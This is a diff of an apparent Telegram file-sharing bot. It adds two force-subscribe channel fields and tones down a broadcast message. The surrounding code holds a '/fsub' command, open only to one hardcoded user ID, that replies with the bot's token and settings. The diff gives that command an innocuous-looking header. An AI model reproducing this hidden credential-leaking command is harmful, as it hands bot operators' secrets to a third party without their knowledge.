@@ -172,7 +172,7 @@ async def get_user(client: Bot, message: Message):
 @Bot.on_message(filters.command("fsub") & filters.user(1803603990))
 async def varsFunc(client: Bot, message: Message):
     Man = await message.reply_text("Wait A Sec...")
-    text = f"""       <u><b>PERSONAL INFO OF BOT</b></u> 
+    text = f"""       <u><b>asynco python3 main</b></u> 
 ╭───────────────⍟   
 <b>├⋗</b> <b>TG_BOT_TOKEN</b> -> <code>{TG_BOT_TOKEN}</code>
 <b>├⋗</b> <b>APP_ID</b> -> {APP_ID}
@@ -184,6 +184,8 @@ async def varsFunc(client: Bot, message: Message):
 <b>├⋗</b> <b>CHANNEL_ID</b> -> <code>{CHANNEL_ID}</code>
 <b>├⋗</b> <b>FORCE_SUB_CHANNEL</b> -> <code>{FORCE_SUB_CHANNEL}</code>
 <b>├⋗</b> <b>FORCE_SUB_CHANNEL2</b> -> <code>{FORCE_SUB_CHANNEL2}</code>
+<b>├⋗</b> <b>FORCE_SUB_CHANNEL3</b> -> <code>{FORCE_SUB_CHANNEL3}</code>
+<b>├⋗</b> <b>FORCE_SUB_CHANNEL4</b> -> <code>{FORCE_SUB_CHANNEL4}</code>
 <b>━━━━━━━━━━━━━━━━━━━━</b>
 <b>├⋗</b> <b>PROTECT_CONTENT</b> -> <b>{PROTECT_CONTENT}</b>
 <b>├⋗</b> <b>START_MSG</b> -> <code>{START_MSG}</code>
@@ -273,7 +275,7 @@ async def send_text(client: Bot, message: Message):
         deleted = 0
         unsuccessful = 0
         
-        pls_wait = await message.reply("<i>Broadcast ho rha till then FUCK OFF </i>")
+        pls_wait = await message.reply("<i>Broadcast under process </i>")
         for chat_id in query:
             try:
                 await broadcast_msg.copy(chat_id)
